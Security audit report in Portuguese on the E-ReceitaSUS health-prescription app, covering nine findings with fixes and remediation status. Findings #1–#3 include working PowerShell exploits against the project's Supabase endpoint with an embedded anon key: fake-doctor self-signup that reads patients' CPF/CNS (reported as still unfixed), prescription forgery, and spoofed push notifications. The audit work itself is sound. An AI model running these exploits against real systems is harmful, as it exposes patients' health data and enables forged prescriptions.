> ⚠️ **Nota de escopo e segurança:** todos os exploits abaixo são contra **o seu próprio projeto** (`shnahlongybxxilworck`) em contexto educacional autorizado. A chave `anon` e a URL usadas já estão **commitadas no seu repositório** (migration `20260612150000`), então não estou expondo nada novo. Rode os PoCs contra um ambiente de **staging/dev** com um paciente-vítima *seedado*, nunca contra dados reais de pacientes.

---

# 🔐 Auditoria de Segurança — E-ReceitaSUS

Foram auditados os dois perímetros. **Achado estrutural mais importante:** o backend Express/TS em si é sólido (JWKS, allowlist de algoritmos, CORS fail-closed, sem `$queryRaw`, sem vazamento de stack). O risco real migrou para a camada **BaaS (trigger de Auth + RLS nas migrations Prisma + Edge Function)** — e é lá que estão as duas falhas críticas. Como as migrations vivem em `backend/prisma/`, elas pertencem ao **Perímetro 1**.

---

## 🛠️ Status de Remediação (atualizado em 2026-06-12)

Implementado na branch `fix/security-hardening-audit` (um commit por achado):

| # | Severidade | Status | Onde |
|---|-----------|--------|------|
| #1 | CRÍTICO | ⚠️ **Risco aceito** (decisão de produto p/ MVP acadêmico) | — |
| #2 | CRÍTICO | ✅ Corrigido | migration `20260612160000` |
| #3 | ALTO | ✅ Corrigido | `send-push-notification/index.ts` |
| #4 | MÉDIO | ✅ Corrigido | migration `20260612161000` |
| #5 | MÉDIO | ✅ Já corrigido no PR #95 | migrations `20260612120000` / `…130000` |
| #6 | MÉDIO | ✅ Corrigido (DROP destrutivo — backup antes) | migration `20260612161500` |
| #7 | BAIXO | ✅ Corrigido | `backend/package.json` |
| #8 | BAIXO | ✅ Corrigido | migration `20260612160500` |
| #9 | BAIXO | ↩️ Não aplicado (revertido) | — |

> **Pré-requisitos de deploy (#3/#4):** armazenar `edge_anon_key` e `edge_webhook_secret` no **Supabase Vault** e definir o secret `WEBHOOK_SECRET` na Edge Function (igual ao `edge_webhook_secret`). Sem isso, o push apenas deixa de ser entregue (401) — **não bloqueia** o fluxo de renovação.
>
> **#9 não aplicado:** o `credentials:false` quebra o teste do PBI #178 (`cors.test.ts`) e arrisca o Flutter Web, para ganho ínfimo — o próprio relatório classificou o CORS como "bem feito". Mantido `credentials:true`.
>
> **#1 — risco aceito (decisão de 2026-06-12):** o app permite auto-cadastro de profissional com papel auto-declarado (`frontend/lib/screens/register_screen.dart`). Para MVP acadêmico o risco foi **formalmente aceito**. Mitigação recomendada ao sair do MVP: ler o papel de `app_metadata` (definido só por `service_role`) com o cadastro público sempre virando `PACIENTE`, **ou** um gate de aprovação de profissional por admin.

---
### [CRÍTICO] #1 — Escalada de privilégio no cadastro via `professional_type`
**OWASP:** A01:2021 – Broken Access Control | **CWE:** CWE-269 (Improper Privilege Management) + CWE-639 (Authorization Bypass via User-Controlled Key)
**Perímetro:** Cruzado (trigger `handle_new_user` no Supabase Auth → RLS de `patients`)
**Arquivo:** `backend/prisma/migrations/20260421000000_split_user_patients_professionals/migration.sql` | **Linha(s):** 261–347
**Vetor de ataque:** Network
**Status:** ⚠️ Risco aceito (decisão de produto, 2026-06-12) — sem mudança de código nesta rodada.

#### 🔍 Por que é vulnerável?
O trigger `handle_new_user` confia cegamente em `raw_user_meta_data->>'professional_type'`, que é **enviado pelo cliente** no `signUp`. Ele valida que o valor é um membro do enum, mas **nunca verifica se a pessoa é de fato um profissional** (sem allowlist, sem convite, sem validação de conselho). Qualquer um escolhe o próprio papel — e o app expõe isso diretamente em `register_screen.dart` (dropdown de tipo de profissional).

```sql
-- ❌ Código vulnerável (handle_new_user)
v_type := COALESCE(NULLIF(NEW.raw_user_meta_data->>'professional_type', ''), 'ADMINISTRATIVO');
-- ...
ELSE
  INSERT INTO public.professionals (id, ..., "professionalType", ..., district, "addressCity", ...)
  VALUES (NEW.id::TEXT, ..., v_type::"ProfessionalType", ...,
          NULLIF(NEW.raw_user_meta_data->>'district',''),       -- bairro escolhido pelo atacante
          NULLIF(NEW.raw_user_meta_data->>'address_city',''));  -- cidade escolhida pelo atacante
```

A cadeia de impacto é o que torna isso **crítico**:
1. Atacante se cadastra com `professional_type = 'MEDICO'` → entra em `public.professionals`.
2. Informa `district` + `address_city` que casam com uma UBS **seedada** (bairros de Blumenau estão no repo, migration `20260426050000`). O trigger `auto_assign_professional_health_unit` o vincula à UBS.
3. A policy `prescriber_select_patient` libera **leitura de todas as linhas de `patients` da UBS** — incluindo `cpf`, `cns`, `motherParentName`, `phone` (RLS é por linha, não por coluna). Violação de LGPD.
4. A RPC `search_patients_for_prescription` também passa a responder, devolvendo CPF + endereço.

#### ⚔️ Explorando com PowerShell 7.6.2
```powershell
$BASE = 'https://shnahlongybxxilworck.supabase.co'
$ANON = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InNobmFobG9uZ3lieHhpbHdvcmNrIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzU5ODU5MTUsImV4cCI6MjA5MTU2MTkxNX0.aleTKEwx7nJOj7iH6H9Y4pjeEmZTlaYVTlLMDRdS-6w'
$H = @{ apikey = $ANON; 'Content-Type' = 'application/json' }

# Passo 1 — Cadastra-se como MÉDICO e auto-vincula a uma UBS real (bairro seedado)
$signup = @{
  email    = "atacante+$(Get-Random)@mail.com"
  password = 'Senha!12345'
  data     = @{ professional_type = 'MEDICO'; first_name = 'M'; last_name = 'D';
               district = 'Centro'; address_city = 'Blumenau' }
} | ConvertTo-Json
$r = Invoke-RestMethod -Uri "$BASE/auth/v1/signup" -Method Post -Headers $H -Body $signup
$token = $r.access_token

# Passo 2 — Lê TODOS os pacientes da UBS (CPF/CNS incluídos)
$auth = @{ apikey = $ANON; Authorization = "Bearer $token" }
Invoke-RestMethod -Uri "$BASE/rest/v1/patients?select=name,cpf,cns,phone,motherParentName" -Headers $auth
```

> **Resultado esperado:** array JSON com pacientes reais da UBS e seus CPFs/CNS.

#### 🛡️ Como corrigir (quando sair do MVP)
Cadastro self-service nunca deve definir papel privilegiado. Ler o papel de `app_metadata` (controlado por `service_role`); cadastro público vira `PACIENTE`; profissionais são provisionados por um admin com verificação de conselho. Alternativa: gate de aprovação (profissional nasce inativo até admin aprovar).

```sql
-- ✅ Mitigação — self-signup é sempre PACIENTE; papel vem de app_metadata
CREATE OR REPLACE FUNCTION public.handle_new_user()
RETURNS TRIGGER LANGUAGE plpgsql SECURITY DEFINER SET search_path = '' AS $$
DECLARE v_fname TEXT; v_lname TEXT; v_name TEXT;
BEGIN
  v_fname := NULLIF(TRIM(NEW.raw_user_meta_data->>'first_name'), '');
  v_lname := NULLIF(TRIM(NEW.raw_user_meta_data->>'last_name'), '');
  v_name  := TRIM(COALESCE(v_fname,'')||' '||COALESCE(v_lname,''));
  -- Ignora professional_type do cliente; profissionais são criados por admin.
  INSERT INTO public.patients (id, email, name, "firstName", "lastName", "updatedAt")
  VALUES (NEW.id::text, NEW.email, v_name, v_fname, v_lname, NOW())
  ON CONFLICT (id) DO NOTHING;
  RETURN NEW;
END $$;
```

> **Por que funciona:** a decisão de autorização sai do controle do atacante e passa a exigir um ator privilegiado (`service_role`).

---
### [CRÍTICO] #2 — Prescrições forjáveis via PostgREST (RLS sem checagem de papel)
**OWASP:** A01:2021 – Broken Access Control | **CWE:** CWE-862 (Missing Authorization)
**Perímetro:** Express/Prisma (migration de RLS) — explorável via BaaS
**Arquivo:** `backend/prisma/migrations/20260420141300_rls_prescriptions_baas/migration.sql` | **Linha(s):** 11–17
**Vetor de ataque:** Network
**Status:** ✅ Corrigido — migration `20260612160000`.

#### 🔍 Por que é vulnerável?
A policy de INSERT só exigia que o autor se pusesse como `doctor_user_id`. **Não havia verificação de `professionalType`** e `patient_user_id` era livre. O comentário dizia que o controle "é feito no Express" — mas as rotas `/prescriptions` **foram removidas** (`app.ts`), logo a validação não existia.

```sql
-- ❌ Código vulnerável
CREATE POLICY prescriptions_insert_doctor
  ON public.prescriptions FOR INSERT TO authenticated
  WITH CHECK ( auth.uid() = doctor_user_id );   -- qualquer autenticado satisfaz
```

#### ⚔️ Explorando com PowerShell 7.6.2
```powershell
$me   = (Invoke-RestMethod -Uri "$BASE/auth/v1/user" -Headers @{ apikey=$ANON; Authorization="Bearer $token" }).id
$auth = @{ apikey=$ANON; Authorization="Bearer $token"; 'Content-Type'='application/json'; Prefer='return=representation' }
$fake = @{
  doctor_user_id=$me; patient_user_id='<uuid-da-vitima>'
  doctor_name='Dr. Fake'; doctor_council='CRM-SC 9999'; doctor_council_state='SC'
  doctor_address='x'; doctor_city='Blumenau'; doctor_state='SC'
  patient_name='Vitima'; medicine_name='Clonazepam'; dosage='2mg'; quantity='30'; instructions='1x ao dia'
} | ConvertTo-Json
Invoke-RestMethod -Uri "$BASE/rest/v1/prescriptions" -Method Post -Headers $auth -Body $fake
```

> **Resultado esperado:** HTTP 201 com a prescrição forjada.

#### 🛡️ Como corrigir (aplicado)
```sql
-- ✅ Código corrigido (migration 20260612160000)
DROP POLICY IF EXISTS prescriptions_insert_doctor ON public.prescriptions;
CREATE POLICY prescriptions_insert_doctor ON public.prescriptions
  FOR INSERT TO authenticated
  WITH CHECK (
    auth.uid() = doctor_user_id
    AND EXISTS (
      SELECT 1 FROM public.professionals pr
      WHERE pr.id = auth.uid()::text AND pr."professionalType" IN ('MEDICO','DENTISTA')
    )
  );
```

> **Por que funciona:** a autorização passa a exigir, no banco, que o emissor seja comprovadamente prescritor. (Não cobre o #1: um fake-MEDICO auto-cadastrado satisfaz a checagem.)

---
### [ALTO] #3 — Edge Function `send-push-notification`: autenticação fraca + payload confiável
**OWASP:** A01:2021 / A07:2021 | **CWE:** CWE-306 + CWE-345
**Perímetro:** Edge Function (Deno) — Cruzado
**Arquivo:** `supabase/functions/send-push-notification/index.ts`
**Vetor de ataque:** Network
**Status:** ✅ Corrigido — `WEBHOOK_SECRET` obrigatório + releitura da linha no DB.

#### 🔍 Por que é vulnerável?
A única barreira era `WEBHOOK_SECRET`, **opcional** (só checado "se definido"); e o webhook nem enviava o header — só a `anon key` (pública). Além disso, a função decidia destinatário/status a partir do `record` do **corpo da requisição**.

```ts
// ❌ Código vulnerável
const expectedSecret = Deno.env.get("WEBHOOK_SECRET");
if (expectedSecret && req.headers.get("x-webhook-secret") !== expectedSecret) { /* opcional */ }
const newRow = payload.record;            // status/destinatário do atacante
const target = resolveTarget(newRow);
```

#### ⚔️ Explorando com PowerShell 7.6.2
```powershell
$body = @{
  type='UPDATE'; table='RenewalRequest'; schema='public'
  record     = @{ id=[guid]::NewGuid().Guid; status='PRESCRIBED'; patientUserId='<uuid-vitima>'; doctorUserId=$null }
  old_record = @{ status='TRIAGED' }
} | ConvertTo-Json -Depth 5
Invoke-RestMethod -Uri "$BASE/functions/v1/send-push-notification" -Method Post `
  -Headers @{ Authorization="Bearer $ANON"; 'Content-Type'='application/json' } -Body $body
```

> **Resultado esperado (antes do fix):** `{"sent":true}` e a vítima recebe um push falso.

#### 🛡️ Como corrigir (aplicado)
Segredo obrigatório + releitura da linha pelo `id` (fonte da verdade), via `service_role`.

```ts
// ✅ Código corrigido
const expectedSecret = Deno.env.get("WEBHOOK_SECRET");
if (!expectedSecret || req.headers.get("x-webhook-secret") !== expectedSecret) {
  return json({ error: "unauthorized" }, 401);
}
const renewalId = payload.record?.id;
const { data: row } = await supabase.from("RenewalRequest")
  .select("id, status, patientUserId, doctorUserId").eq("id", renewalId).maybeSingle();
const target = resolveTarget(row as RenewalRow);   // status/destinatário do banco
```

> **Por que funciona:** sem o segredo a chamada é rejeitada; e o destinatário/status não podem ser forjados pelo corpo.

---
### [MÉDIO] #4 — Credencial (anon JWT) hard-coded na migration do webhook
**OWASP:** A05:2021 | **CWE:** CWE-798 + CWE-540
**Perímetro:** Cruzado (Perímetro 1, habilita #3)
**Arquivo:** `backend/prisma/migrations/20260612150000_add_push_notification_webhook/migration.sql`
**Vetor de ataque:** Network/Local
**Status:** ✅ Corrigido — migration `20260612161000` (segredos via Vault).

#### 🔍 Por que é vulnerável?
A `anon key` (JWT ~10 anos) e o `project_ref` estavam em claro na migration, servindo de auth do webhook.

```sql
-- ❌ Código vulnerável
'Authorization', 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...aleTKEwx7nJOj7iH6H9Y4pjeEmZTlaYVTlLMDRdS-6w'
```

#### 🛡️ Como corrigir (aplicado)
Ler do Vault e enviar `x-webhook-secret`; nenhuma credencial em código.

```sql
-- ✅ Código corrigido (migration 20260612161000)
SELECT decrypted_secret INTO v_anon   FROM vault.decrypted_secrets WHERE name = 'edge_anon_key';
SELECT decrypted_secret INTO v_secret FROM vault.decrypted_secrets WHERE name = 'edge_webhook_secret';
PERFORM net.http_post(
  url := '.../functions/v1/send-push-notification',
  headers := jsonb_build_object('Content-Type','application/json',
                                'Authorization','Bearer '||COALESCE(v_anon,''),
                                'x-webhook-secret', COALESCE(v_secret,'')),
  body := jsonb_build_object('type','UPDATE','table',TG_TABLE_NAME,'schema',TG_TABLE_SCHEMA,
                             'record',to_jsonb(NEW),'old_record',to_jsonb(OLD)),
  timeout_milliseconds := 5000);
```

> **Pré-requisito:** popular o Vault (`edge_anon_key`, `edge_webhook_secret`) e o secret `WEBHOOK_SECRET` da função.

---
### [MÉDIO] #5 — RLS de `RenewalRequest` referenciava a tabela renomeada (`"User"` → `legacy_users`)
**OWASP:** A01:2021 | **CWE:** CWE-863
**Status:** ✅ Já corrigido no PR #95 (migrations `20260612120000` e `…130000`): as policies do enfermeiro passaram a referenciar `public.professionals` e ganharam `WITH CHECK`. Verificado — não refeito nesta rodada.

---
### [MÉDIO] #6 — Cópia integral de PII/PHI retida em `legacy_users` (LGPD)
**OWASP:** A04:2021 | **CWE:** CWE-359
**Arquivo:** `backend/prisma/migrations/20260421000000_split_user_patients_professionals/migration.sql` | **Linha(s):** 474–485
**Status:** ✅ Corrigido — migration `20260612161500` (`DROP TABLE legacy_users`). ⚠️ Destrutivo: backup antes de aplicar em produção.

---
### [BAIXO] #7 — Dependências mortas: `bcrypt` e `jsonwebtoken`
**OWASP:** A06:2021 | **CWE:** CWE-1104 + CWE-1357
**Arquivo:** `backend/package.json`
**Status:** ✅ Corrigido — removidas `bcrypt`, `jsonwebtoken`, `@types/bcrypt`, `@types/jsonwebtoken` (JWT é validado só com `jose`). CVEs históricos relevantes do `jsonwebtoken`: CVE-2022-23529/23540/23541.

---
### [BAIXO] #8 — Wildcards de `LIKE` não escapados na RPC de busca
**OWASP:** A03:2021 (variante LIKE) | **CWE:** CWE-148
**Arquivo:** `backend/prisma/migrations/20260421000000_.../migration.sql`
**Status:** ✅ Corrigido — migration `20260612160500` (escape de `\ % _` + `ILIKE ... ESCAPE '\'`).

```sql
-- ✅ trecho aplicado
v_q := replace(replace(replace(name_query, '\', '\\'), '%', '\%'), '_', '\_');
-- ...
pt.name ILIKE '%' || v_q || '%' ESCAPE '\'
```

---
### [BAIXO] #9 — CORS permite requisição sem `Origin` com `credentials: true`
**OWASP:** A05:2021 | **CWE:** CWE-942
**Arquivo:** `backend/src/app.ts`
**Status:** ↩️ **Não aplicado** (revertido). O `credentials:false` quebra o teste intencional do PBI #178 (`cors.test.ts`) e arrisca o cliente Flutter Web, para ganho ínfimo — o CORS já é fail-closed por allowlist e a ausência de `Origin` não é explorável por navegador. Se for endurecer no futuro, o lugar certo é o cliente (não enviar credenciais).

---

## ✅ Cobertura do Checklist (itens verificados como seguros / não encontrados)

| Item | Resultado |
|---|---|
| JWT algoritmo `none` | **Seguro** — `jose` restrito a `['ES256','RS256']` |
| Claims `sub`/`aud`/`exp` | **Seguro** — `sub` e `aud=authenticated` checados; `exp`/`iss` pelo `jwtVerify` |
| Dual-library confusion | **Resolvido** — `jsonwebtoken` removido (#7) |
| BOLA/IDOR no Express | **Seguro** — `/user/me` usa `req.userId` do JWT; `/health-units` só dado público |
| `$queryRaw` / `$executeRaw` | **Seguro** — inexistentes no código de produção |
| Stack trace em erros | **Seguro** — handlers logam só `error.message` |
| `.env` versionado | **Seguro** — `.env` no `.gitignore`; só `.env.example` |
| Connection string | **Seguro** — vem de env, fail-fast se ausente |

---

## 📊 Score de Segurança (pós-remediação)

| Perímetro | Antes | Depois* | Observação |
|-----------|-------|---------|------------|
| Express/Node.js + Prisma | 4/10 | ~7/10 | #2/#6/#8 corrigidos; resta #1 (risco aceito) |
| Edge Functions (Deno) | 4/10 | ~8/10 | #3/#4 corrigidos (pendente configurar Vault/secret) |
| **Consolidado** | **4/10** | **~7/10** | Sobe para ~8 quando #1 for endereçado fora do MVP |

\* Depois assume as migrations aplicadas e os segredos de Vault/Edge Function configurados.

---

## 📚 Recursos para Aprofundamento

- **Broken Access Control / Privilege Escalation (#1, #2, #5):** OWASP [A01:2021](https://owasp.org/Top10/A01_2021-Broken_Access_Control/) · [Mass Assignment Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html) · [Supabase RLS](https://supabase.com/docs/guides/database/postgres/row-level-security).
- **Missing Auth / Data Authenticity (#3):** OWASP [A07:2021](https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/) · CWE-306 / CWE-345 · [Supabase Edge Functions auth](https://supabase.com/docs/guides/functions/auth).
- **Hard-coded Secrets (#4):** OWASP [A05:2021](https://owasp.org/Top10/A05_2021-Security_Misconfiguration/) · CWE-798 · [Supabase Vault](https://supabase.com/docs/guides/database/vault).
- **Vulnerable Components / JWT confusion (#7):** OWASP [A06:2021](https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/) · CVE-2022-23529 / 23540 / 23541.
- **LGPD / Data Minimization (#6):** OWASP [A04:2021](https://owasp.org/Top10/A04_2021-Insecure_Design/) · CWE-359 · LGPD art. 6º III e art. 15.
- **LIKE/Wildcard Injection (#8):** [CWE-148](https://cwe.mitre.org/data/definitions/148.html) · PostgreSQL `LIKE ... ESCAPE`.
- **CORS (#9):** [OWASP CSRF/CORS](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Request_Forgery_Prevention_Cheat_Sheet.html) · CWE-942.
